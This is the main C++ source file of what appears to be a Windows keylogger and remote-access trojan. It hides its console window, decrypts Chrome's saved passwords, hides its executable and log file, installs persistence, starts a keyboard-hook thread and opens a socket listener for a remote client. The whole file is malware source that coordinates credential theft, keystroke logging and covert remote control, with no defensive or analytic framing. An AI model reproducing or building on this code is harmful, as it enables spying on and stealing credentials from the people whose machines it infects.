//-- The C standard Library
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--Pragma comment for linker.
#include <winsock.h>
#include <windows.h>
#include <fstream>
#include <iostream>
#include <thread>
#include <string>
#include <sstream>
#include <vector>
#include <random>
#include <chrono>
#include <vector>
#include <thread>
#include "KeyboardHooking.h"
#include "ScreenCapture.h"
#include "Presistence.h"
#include "SocketsConnection.h"
#include "InfoExtractor.h"


int __cdecl main(void)
{

	FreeConsole();
	 DecryptPasswordFor(CHROME);
	//#ifdef _DEBUG_
	//	ShowWindow(GetConsoleWindow(), 1);
	//#else
	//	ShowWindow(GetConsoleWindow(), 0);
	//#endif
	std::string file_exe, logfile;
	bool statues = false;
	statues = SetFileNames(file_exe, logfile);
	if (file_exe.size() == 0 || logfile.size() == 0 || statues == false)
		return 0;

	else{
		Hide(file_exe);
		Hide(logfile);
		Persistence("add", file_exe);

		std::thread t1(CreateHookThread);
		unsigned int clientId = create_socket_clientid();
		std::thread t2(start_listener,clientId);

	

	std::cin.get();
	t1.join();
	t2.join();
	}


	return 0;
};

